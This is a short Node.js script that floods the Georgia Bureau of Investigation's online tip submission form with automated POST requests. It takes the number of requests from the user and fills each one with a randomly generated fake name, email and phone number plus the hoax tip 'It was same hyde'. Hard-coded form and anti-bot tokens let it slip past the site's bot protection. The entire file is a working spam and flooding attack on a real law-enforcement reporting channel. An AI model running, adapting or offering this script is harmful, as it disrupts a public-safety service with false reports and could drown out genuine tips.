var Fakerator = require("fakerator");
var fakerator = Fakerator("default");
const fetch = require("node-fetch");
const readline = require("readline");
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
rl.question("Enter the number of requests to make: ", (answer) => {
    var num = parseInt(answer);
    for (var i = 0; i < num; i++) {
        fetch("https://gbi.georgia.gov/submit-tips-online", {
            "credentials": "include",
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1"
            },
            "referrer": "https://gbi.georgia.gov/submit-tips-online",
            "body": `name=${fakerator.names.name()}&email=${fakerator.internet.email()}&phone=${fakerator.phone.number()}&tip_notes=It was same hyde&form_build_id=form-rIsxToqksnd5oewwOBf6iNs_cj3vHYrccXQqphbJVOM&form_id=webform_submission_webform_1446_node_1446_add_form&antibot_key=FBPvIns_wykC7mhyHIj3lx5xBGQo_BfGa3Z7g2Wh2lc&op=Submit`,
            "method": "POST",
            "mode": "cors"
        }).then(function (response) {
            console.log(response.status);
        }).catch(function (error) {
            console.log(error);
        });
    }
    rl.close();
});
